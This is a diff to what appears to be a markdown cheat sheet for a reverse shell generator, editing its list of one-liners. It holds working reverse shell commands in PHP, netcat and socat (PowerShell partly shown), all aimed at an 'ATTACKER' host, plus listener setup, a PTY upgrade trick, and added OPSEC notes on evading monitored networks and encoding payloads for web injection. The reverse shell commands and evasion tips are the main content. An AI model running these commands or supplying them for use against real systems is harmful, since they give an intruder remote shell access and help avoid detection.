@@ -14,12 +14,12 @@ Reverse shell one-liner generator — 50+ shells, encoded variants, web UI at re
 
 ## Quick Start
 
-```
+```text
 # Web UI: https://revshells.com
 # Enter: IP, Port, Shell type → Copy one-liner
-
-# Popular one-liners (substitute IP/PORT):
 ```
+
+## Popular one-liners (substitute IP/PORT)
 
 ## Shell Cheatsheet
 
@@ -36,12 +36,20 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER'
 # PHP
 php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 
-# Netcat
+# Netcat (depends on -e support)
 nc -e /bin/sh ATTACKER PORT
-nc ATTACKER PORT | /bin/sh | nc ATTACKER PORT2
 
 # Socat
 socat tcp:ATTACKER:PORT exec:'/bin/bash',pty,stderr,setsid,sigint,sane
+```
+
+## Listener-first workflow
+
+```bash
+# Start listener before payload execution
+nc -lvnp PORT
+# or
+ncat -lvnp PORT
 ```
 
 ## Upgrade Shell to PTY
@@ -51,8 +59,15 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 # Ctrl+Z → stty raw -echo; fg → export TERM=xterm
 ```
 
+## OPSEC / Reliability Notes
+
+- Prefer payloads matching actual runtime on target (bash/python/powershell).
+- Use encoded output only when context requires it (web injection, quote escaping).
+- Prefer TLS-capable approaches in monitored networks.
+- Avoid assuming netcat `-e` exists; keep fallback payloads ready.
+
 ## Resources
 
 | File | When to load |
 |------|--------------|
-| `references/` | Encoded variants and PTY upgrade techniques |
+| `references/listeners-and-pty-upgrades.md` | Listener setup, payload selection matrix, PTY stabilization and encoding strategy |
